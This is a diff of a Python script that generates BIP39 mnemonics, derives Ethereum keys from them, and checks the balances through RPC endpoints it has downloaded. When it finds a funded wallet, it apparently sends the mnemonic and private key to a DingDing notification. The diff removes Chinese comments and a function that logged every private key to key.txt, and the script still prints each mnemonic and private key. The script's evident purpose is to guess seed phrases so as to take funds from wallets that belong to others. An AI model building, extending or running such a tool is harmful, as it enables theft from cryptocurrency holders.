@@ -39,7 +39,6 @@ if not bip:
     printer(f"{yellow}Downloading bip39.txt and rpc.txt files...{reset}\n")
     
     try:
-        # 下载 bip39.txt 和 rpc.txt
         reqBip = requests.get(bip39_url, timeout=10)
         reqBip.raise_for_status()
         content_bip = reqBip.content.decode("utf-8")
@@ -48,7 +47,6 @@ if not bip:
         reqRpc.raise_for_status()
         content_rpc = reqRpc.content.decode("utf-8")
         
-        # 保存文件
         with open("bip39.txt", "w", encoding="utf-8") as filebip:
             filebip.write(content_bip)
         
@@ -71,9 +69,7 @@ if not os.path.exists("88.txt"):
         print(f"{red}Failed to create 88.txt file: {e}{reset}")
 
 def get_working_rpc():
-    # 读取文件并去掉空行
     with open("rpc.txt", "r", encoding="utf-8") as file:
-        # 过滤掉空行，strip去掉行首尾的空格和换行符
         rpc_urls = [url.strip() for url in file.readlines() if url.strip()]
     
     random.shuffle(rpc_urls)
@@ -112,15 +108,6 @@ def generate_eth_address_from_mnemonic(mnemonic):
     private_key = acct.key
     eth_address = acct.address
     return eth_address, private_key
-
-def save_private_key(private_key):
-    try:
-        # 打开 key.txt 文件并追加保存私钥
-        with open("key.txt", "a", encoding="utf-8") as key_file:
-            key_file.write(f"Private Key: {private_key.hex()}\n")
-        print(f"{green}Successfully saved private key to key.txt{reset}")
-    except Exception as e:
-        print(f"{red}Failed to save private key to key.txt: {e}{reset}")
 
 z = 0
 ff = 0
@@ -175,15 +162,11 @@ while True:
             
             send_dingding_notification(eth_addr, mnemonic, private_key, eth_balance)
         
-        # 打印 ETH 地址及余额，并保存私钥到 key.txt
         addr_space = " " * (44 - len(eth_addr))
         print(f"({z}) ETH: {cyan}{eth_addr}{reset}{addr_space}[Balance: {cyan}{eth_balance}{reset}]")
         print(f"Mnemonic: {yellow}{mnemonic}{reset}")
         print(f"Private Key: {private_key.hex()}")
         print(f"{'-' * 66}")
-        
-        # 保存私钥到 key.txt，无论余额是否大于 0
-        save_private_key(private_key)
     
     except ValueError:
         continue
